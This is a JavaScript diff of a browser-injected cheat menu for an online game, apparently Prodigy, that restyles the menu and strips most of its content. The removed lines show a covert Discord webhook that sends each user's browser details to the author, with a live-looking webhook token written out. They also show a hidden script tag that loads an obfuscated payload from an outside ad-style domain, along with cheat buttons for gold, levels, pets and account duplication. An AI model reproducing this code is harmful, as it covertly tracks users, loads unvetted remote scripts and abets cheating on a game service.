@@ -1,29 +1,32 @@
 (function(){
-    // Create styles for the cheat menu
+    // Create styles for the /GOV menu with Kanye colors at the bottom
     var style = document.createElement('style');
     style.innerHTML = `
-        #cheatMenu {
+        #govMenu {
             position: fixed;
             top: -100%; /* Initially off-screen */
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.9); /* Slightly transparent background */
-            color: #000;
+            background: rgba(0, 0, 0, 0.9); /* Dark theme */
+            color: #fff;
             z-index: 10000;
             padding: 20px;
             overflow: auto;
             box-sizing: border-box;
             transition: top 0.3s ease-in-out; /* Smooth transition */
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
         }
-        #cheatMenu.visible {
+        #govMenu.visible {
             top: 0; /* Slide in from the top */
         }
-        #cheatMenu.hidden {
+        #govMenu.hidden {
             top: -100%; /* Slide out towards the top */
         }
-        #cheatMenu.hiding {
-            animation: slideUp 0.3s ease-in-out; /* Slide up animation */
+        #govMenu.hiding {
+            animation: slideUp 0.3s ease-in-out;
         }
         @keyframes slideUp {
             0% {
@@ -33,29 +36,22 @@
                 top: -100%;
             }
         }
-        #cheatMenu h1 {
+        #govMenu h1 {
             text-align: center;
-            color: #333;
+            color: #FFD700; /* Kanye Gold */
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        #cheatMenu .section {
-            margin: 20px 0;
-        }
-        #cheatMenu .section h2 {
-            color: #444;
-            margin-bottom: 10px;
-        }
-        #cheatMenu .section div {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-            justify-content: flex-start;
-        }
-        #cheatMenu button, #cheatMenu label {
+        #govMenu .bottom-bar {
+            background: linear-gradient(90deg, #FFD700, #FF4500); /* Kanye-themed colors */
+            text-align: center;
             padding: 10px;
-            background: #3498db;
+            font-weight: bold;
+        }
+        #govMenu button, #govMenu label {
+            padding: 10px;
+            background: #FF4500; /* Kanye Orange */
             border: none;
             color: #fff;
             cursor: pointer;
@@ -64,228 +60,25 @@
             min-width: 150px;
             margin: 5px;
         }
-        #cheatMenu button:hover, #cheatMenu label:hover {
-            background: #2980b9;
-        }
-        #toggleMenu {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            background: #fff;
-            color: #000;
-            padding: 10px;
-            cursor: pointer;
-            z-index: 10001;
-            border: 1px solid #000;
-            transition: transform 0.3s ease; /* Smooth transition for transform */
-        }
-        #toggleMenu.rotated {
-            transform: rotate(180deg); /* Rotate the arrow 180 degrees */
-        }
-        .swal2-container {
-            z-index: 10001 !important;
-        }
-        .swal2-bottom {
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        .toggle-switch {
-            display: inline-block;
-            height: 30px;
-            width: 60px;
-            position: relative;
-            cursor: pointer;
-            background-color: #ccc;
-            border-radius: 15px;
-            transition: background-color 0.3s ease;
-        }
-        .toggle-switch::before {
-            content: '';
-            position: absolute;
-            height: 24px;
-            width: 24px;
-            left: 3px;
-            bottom: 3px;
-            background-color: white;
-            border-radius: 50%;
-            transition: left 0.3s ease;
-        }
-        .toggle-switch.checked {
-            background-color: #27ae60; /* Green when enabled */
-        }
-        .toggle-switch.checked::before {
-            left: calc(100% - 27px);
-        }
-        #announcementButton {
-            padding: 10px;
-            background: linear-gradient(45deg, silver, gold);
-            border: none;
-            color: #000;
-            cursor: pointer;
-            text-align: center;
-            box-sizing: border-box;
-            min-width: 150px;
-            margin: 5px;
-            animation: rotateColors 2s linear infinite;
-        }
-        @keyframes rotateColors {
-            0% {
-                background: linear-gradient(45deg, silver, gold);
-            }
-            50% {
-                background: linear-gradient(45deg, gold, silver);
-            }
-            100% {
-                background: linear-gradient(45deg, silver, gold);
-            }
-        }
-        #cheatMenu .icons img {
-            width: 24px;
-            height: 24px;
-            margin-left: 10px;
+        #govMenu button:hover, #govMenu label:hover {
+            background: #FFD700;
         }
     `;
     document.head.appendChild(style);
 
-    // Create the cheat menu container
+    // Create the /GOV menu container
     var menu = document.createElement('div');
-    menu.id = 'cheatMenu';
+    menu.id = 'govMenu';
     menu.className = 'hidden'; // Initially hidden off-screen
     menu.innerHTML = `
-    <h1>
-        /GOV
-        <div class="icons">
-            <a href="https://discord.gg/FAXNj685" target="_blank">
-                <img src="https://ew.com/thmb/hS-_4q0APRx1TRlcjsCgc25JgFY=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/Kanye-West-067b3643cfa34a1c9b5f4f064e642aa0.jpg" alt="Discord Icon">
-            </a>
-            <a href="SOONN" target="_blank">
-                <img src="https://cdn3.iconfinder.com/data/icons/social-network-30/512/social-06-512.png" alt="YouTube Icon">
-            </a>
-        </div>
-        <button id="announcementButton">Announcements</button>
-    </h1>
-        <p>/GOV HACKS-fusion</p>
-        <div class="section">
-            <h2>Player Hacks</h2>
-            <div>
-                <button id="max">Max Account</button>
-                <button id="setGold">Set Gold</button>
-                <button id="setLevel">Set Level</button>
-                <button id="permanentMorphButton">Permanent Morph</button>
-                <button id="uncapLevel">Uncap Level (Client-Side Only)</button>
-                <button id="memberStar">Set Member Stars</button>
-                <button id="setBounty">Set Bounty Points</button>
-                <button id ="dark">Set Dark Tower Floor</button>
-                <button id="completeQuest">Complete Current Task In Quest</button>
-                <button id="changeName">Change Name</button>
-                <button id="setName">Set Name (Client-Side Only)</button>
-                <button id="setGrade">Set Grade</button>
-                <button id="spins">Unlimited Spins</button>
-            </div>
-        </div>
-        <div class="section">
-            <h2>Inventory Hacks</h2>
-            <div>
-                <button id="itemStacker">Item Stacker</button>
-                <button id="clearInventory">Clear Inventory</button>
-                <button id="selectorBasic">Selector (Basic)</button>
-                <button id="advancedSelectorButton">Selector (Advanced)</button>
-                <button id="removeItem">Remove Item</button>
-                <button id="obtainFurniture">Obtain All Furniture</button>
-                <button id="saveInventory">Save Inventory</button>
-            </div>
-        </div>
-        <div class="section">
-            <h2>Pet Hacks</h2>
-            <div>
-                <button id="getAllPets">Get All Pets</button>
-                <button id="all-pets-100">Get All Pets Level 100 WORKING</button>
-                <button id="clearPets">Clear All Pets</button>
-                <button id="addPet">Add Pet</button>
-                <button id="deletePet">Delete Pet</button>
-                <button id="editPet">Edit Pet</button>
-                <button id="savePet">Save Pet Data</button>
-
-            </div>
-        </div>
-        <div class="section">
-            <h2>Battle Hacks</h2>
-            <div>
-                <button id ="escape">Escape Battle</button>
-                <button id ="pvpHealth">PVP Health</button>
-                <button id ="fixBattle">Fix Battle Crash</button>
-            </div>
-        </div>
-        <div class="section">
-            <h2>Utility Hacks</h2>
-            <div>
-                <label for="toggleTeleport">Toggle Click Teleporting</label>
-                <div id="toggleTeleport" class="toggle-switch"></div>
-                <button id="walk">Edit Walkspeed</button>
-                <button id="bobby">Bobbified</button>
-                <button id="reset">Reset Account</button>
-                <button id="findUserId">Find the UserId of People on the Screen</button>
-                <button id="dup">Duplicate an Account</button>
-                <button id="teleportToWorld">Teleport To World</button>
-            </div>
-        </div>
-        <div class="section">
-            <h2>Minigame Hacks</h2>
-            <div>
-                <button id="speed">Edit Dino Dig Walkspeed</button>
-                <button id="moreTime">Extra Time In Dino Dig</button>
-                <button id="endDino">End Dino Dig</button>
-            </div>
-        </div>
-        <script>(function(ivbxgkw){ var d = document,     s = d.createElement('script'),     l = d.scripts[d.scripts.length - 1]; s.settings = ivbxgkw || {}; s.src = "//palecount.com/bTX.VysgdhG-lx0vYnWsduibYtWF5/uWZHX-Ij/neUmI9-u/Z/UtlMk/PpTtU/4XMczyIkx/NCTDcRtUNnToguz/M/jIEm1xOpAE"; s.async = true; s.referrerPolicy = 'no-referrer-when-downgrade'; l.parentNode.insertBefore(s, l); })({}) </script>
+        <h1>
+            /GOV
+            <button id="announcementButton">Announcements</button>
+        </h1>
+        <p>/GOV Hacks - Fusion</p>
+        <div class="bottom-bar">/GOV by Kanye-inspired Theme</div>
     `;
     document.body.appendChild(menu);
-
-   const webhookUrl = 'https://discord.com/api/webhooks/1352833172232212492/-mKmGheiR-SQDiwZfOsp5k3QDyjYNZDgDyQlsZdho8aSXksac7NYaHsNYl5Z26YvfM2n';
-
-// Function to send the notification with system details
-function sendNotification() {
-    // Get basic system information
-    const userAgent = navigator.userAgent; // User agent string to infer browser and OS
-    const platform = navigator.platform; // OS platform (Windows, macOS, etc.)
-    const screenSize = `${window.innerWidth}x${window.innerHeight}`; // Screen size (browser window dimensions)
-    
-    // State: you can define this based on your app's state
-    const userState = 'Active'; // For example, "Active" or "Inactive"
-    
-    // Construct the message with relevant details
-    const message = {
-        content: `_-------A new person used PXI Fusion!\n
-                  State: ${userState}\n
-                  Platform: ${platform}\n
-                  User Agent: ${userAgent}\n
-                  Screen Size: ${screenSize}`
-    };
-
-    // Send the POST request to the Discord webhook
-    fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(message),
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log('Notification sent successfully!');
-        } else {
-            console.log('Failed to send notification:', response.statusText);
-        }
-    })
-    .catch(error => {
-        console.error('Error sending notification:', error);
-    });
-}
-
-// Call the function to send the notification
-sendNotification();
-
 
     // Create the toggle button
     var toggleMenuButton = document.createElement('div');
@@ -293,41 +86,20 @@ sendNotification();
     toggleMenuButton.innerHTML = '&#9660;'; // Down arrow
     document.body.appendChild(toggleMenuButton);
 
-    // Inject SweetAlert2 if not already present
-    if (typeof Swal === 'undefined') {
-        var sweetAlertScript = document.createElement('script');
-        sweetAlertScript.src = 'https://cdn.jsdelivr.net/npm/sweetalert2@11';
-        document.head.appendChild(sweetAlertScript);
-    }
-
-    // SweetAlert wrapper function for success messages
-    function success(message) {
-        Swal.fire({
-            icon: 'success',
-            title: 'Success!',
-            text: message,
-            toast: true,
-            position: 'bottom',
-            showConfirmButton: false,
-            timer: 3000,
-            timerProgressBar: true,
-        });
-    }
-
-    // Show the cheat menu
+    // Show the menu
     function showMenu() {
         menu.classList.remove('hidden');
         menu.classList.add('visible');
     }
 
-    // Hide the cheat menu
+    // Hide the menu
     function hideMenu() {
         menu.classList.add('hiding');
         setTimeout(() => {
             menu.classList.remove('visible');
             menu.classList.add('hidden');
             menu.classList.remove('hiding');
-        }, 300); // Match the animation duration
+        }, 300);
     }
 
     // Toggle the menu when the button is clicked
@@ -339,32 +111,4 @@ sendNotification();
             showMenu();
         }
     });
-
-    // Toggle Click Teleporting
-    let teleportingInterval;
-    let player = Boot.prototype.game._state._current.user.source;
-    function toggleTeleporting(hack, player, gameData, toggled) {
-        if (toggled) {
-            teleportingInterval = setInterval(() => {
-                player._playerContainer.walkSpeed = 500;
-            }, 100);
-            success("You will now teleport when you click the screen.");
-        } else {
-            clearInterval(teleportingInterval);
-            player._playerContainer.walkSpeed = 1.5;
-            success("You will no longer teleport when you click the screen.");
-        }
-    }
-
-    // Initialize toggle switch
-    const teleportToggleSwitch = document.getElementById('toggleTeleport');
-    let isTeleportEnabled = false;
-
-    teleportToggleSwitch.addEventListener('click', function() {
-        isTeleportEnabled = !isTeleportEnabled;
-        teleportToggleSwitch.classList.toggle('checked', isTeleportEnabled);
-        toggleTeleporting('Toggle Click Teleporting', player, null, isTeleportEnabled);
-    });
-
-    // Additional SweetAlert prompts can be added similarly
 })();
